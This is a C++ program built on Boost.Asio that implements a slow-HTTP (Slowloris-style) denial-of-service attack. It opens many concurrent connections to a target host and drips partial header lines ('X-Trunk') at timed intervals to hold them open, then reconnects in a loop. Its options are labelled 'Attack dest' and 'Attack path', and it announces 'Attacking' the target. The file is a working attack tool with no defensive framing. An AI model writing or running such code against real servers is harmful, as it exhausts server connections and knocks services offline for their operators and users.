#include <iostream>
#include <list>
#include <boost/asio.hpp>
#include <boost/bind.hpp>
#include <boost/format.hpp>
#include <boost/program_options.hpp>

using namespace std;
using namespace boost;
using namespace asio;
namespace po = boost::program_options;

int concurrency, trunks, interval;
string host, path;

class Request {
public:
	deadline_timer* timer;
	ip::tcp::iostream* stream;
	int id;
	int count;

	Request(io_service& io, int id) : id(id), count(0) {
		timer = new deadline_timer(io, posix_time::seconds(interval));
		stream = new ip::tcp::iostream(host, "http");
	}
	~Request() {
		delete timer;
		delete stream;
	}

	void open() {
		cout << format("Open Request: %1%") % id << endl;

		*stream << format(
			"GET %1% HTTP/1.1\r\n"
			"Host: %2%\r\n"
			"User-Agent: Boost.Asio\r\n"
			"Accept: */*\r\n"
			"Connection: Keep-Alive\r\n"
		) % path % host;

		stream->flush();
		timer->expires_from_now(posix_time::seconds(interval));
		timer->async_wait(bind(&Request::append, this));
	}

	void append() {
		cout << format("Append Request: %1%->%2%") % id % count << endl;
		*stream << format("X-Trunk: %1%\r\n") % count;
		stream->flush();

		if (count < trunks) {
			count++;
			timer->expires_from_now(posix_time::seconds(interval));
			timer->async_wait(bind(&Request::append, this));
		} else {
			timer->expires_from_now(posix_time::seconds(interval));
			timer->async_wait(bind(&Request::close, this));
		}
	}

	void close() {
		*stream << "\r\n";
		stream->flush();
		stream->close();

		cout << format("Close Request: %1%") % id << endl;

		stream->connect(host, "http");
		count = 0;
		timer->expires_from_now(posix_time::seconds(interval));
		timer->async_wait(bind(&Request::open, this));
	}
};

void createRequest(io_service* io, deadline_timer* timer, int id) {
	Request* req = new Request(*io, id);
	req->open();

	if(id < concurrency) {
		timer->expires_from_now(posix_time::millisec(100));
		timer->async_wait(bind(createRequest, io, timer, ++id));
	}
}

int main(int argc, char *argv[]) {
	po::options_description desc("Options");
	desc.add_options()
		("dest,d", po::value<string>()->default_value("localhost"), "Attack dest")
		("path,p", po::value<string>()->default_value("/"), "Attack path")
		("concurrency,c", po::value<int>()->default_value(20), "Concurrency requests")
		("trunks,t", po::value<int>()->default_value(10), "Trunks count")
		("interval,i", po::value<int>()->default_value(5), "Interval between trunks")
		("help,h", "Show this help info");

	po::variables_map vm;

	try{
		po::store(po::parse_command_line(argc, argv, desc), vm);
		if (vm.count("help")) {
			cout << desc << endl;
			return 1;
		}
		po::notify(vm);

		host = vm["dest"].as<string>();
		path = vm["path"].as<string>();
		concurrency = vm["concurrency"].as<int>();
		trunks = vm["trunks"].as<int>();
		interval = vm["interval"].as<int>();
	} catch(po::error& e) {
		cerr << "Error: " << e.what() << endl << endl;
		cout << desc << endl;
		return -1;
	}

	io_service io;
	deadline_timer timer(io, posix_time::millisec(100));
	timer.async_wait(bind(createRequest, &io, &timer, 0));

	cout << format("Attacking %1%%2% with concurrency=%3%, trunks=%4%, interval=%5%") % host % path % concurrency % trunks % interval << endl << endl;

	io.run();

	return 0;
}